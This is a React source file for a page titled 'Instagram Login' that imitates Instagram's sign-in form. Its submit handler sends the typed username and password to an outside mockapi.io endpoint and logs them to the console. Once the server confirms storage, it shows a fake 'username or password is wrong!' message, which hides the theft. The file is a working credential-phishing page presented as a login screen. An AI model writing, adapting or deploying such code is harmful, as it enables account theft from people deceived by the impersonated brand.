import React, { useState } from "react";
import axios from "axios";
import Swal from "sweetalert2";
const url = 'https://69b6bb88583f543fbd9e67e9.mockapi.io/user/instagram';


const InstagramLogin = () => {

    const [inputName, setUsername] = useState({
        username: "",
        password: "",
    });



    const handleChange = (e) => {
        const { name, value } = e.target;
        setUsername({ ...inputName, [name]: value });
    };


    const handleLogin = (e) => {
        e.preventDefault();
        console.log(inputName);
        postData();
       
    };

    const postData = async () => {
        try {
            const response = await axios.post(url, inputName);
            if(response.status === 201){
                Swal.fire("username or password is wrong!");
            }
        } catch (error) {
            console.error("Error occurred while logging in:", error);
        }
    };


    return (
        <div className=" w-90 rounded-lg  bg-white p-1 flex flex-col items-center gap-4">

            <div className="bg-white w-full    p-8">

                {/* Logo */}
                <h1 className="text-4xl  font-semibold text-center mb-8 font-serif ">
                    Instagram Login
                </h1>

                {/* Login Form */}
                <form onSubmit={handleLogin} className="flex flex-col gap-3">

                    <input
                        value={inputName.username}
                        onChange={handleChange}
                        name="username"
                        type="text"
                        placeholder="Enter Your  Username"
                        className="border p-2 text-lg rounded bg-gray-50 focus:outline-none"
                        required
                    />

                    <input
                        value={inputName.password}
                        onChange={handleChange}
                        name="password"

                        type="password"
                        placeholder="Password"
                        className="border p-2 text-lg rounded bg-gray-50 focus:outline-none"
                        required
                    />

                    <button className="bg-blue-500 text-lg mt-5 cursor-pointer text-white py-2 rounded font-semibold hover:bg-blue-600">
                        Log In
                    </button>

                </form>

                {/* Divider */}
                <div className="flex items-center my-6">
                    <div className="flex-grow border-t"></div>
                    <span className="mx-3 text-gray-400 text-sm font-semibold">OR</span>
                    <div className="flex-grow border-t"></div>
                </div>

                {/* Facebook Login */}
                <button className="text-blue-700 cursor-pointer font-semibold  w-full">
                    Log in with Facebook
                </button>

                {/* Forgot Password */}
                <p className="text-xs text-center mt-4 text-gray-500 cursor-pointer">
                    Forgot password?
                </p>

            </div>

            {/* Signup */}

            <div className="  bottom-20 bg-white    p-4 text-center text-sm">
                Don't have an account?{" "}
                <span className="text-blue-500 font-semibold cursor-pointer">
                    Sign up
                </span>
            </div>

        </div>
    );
};

export default InstagramLogin;
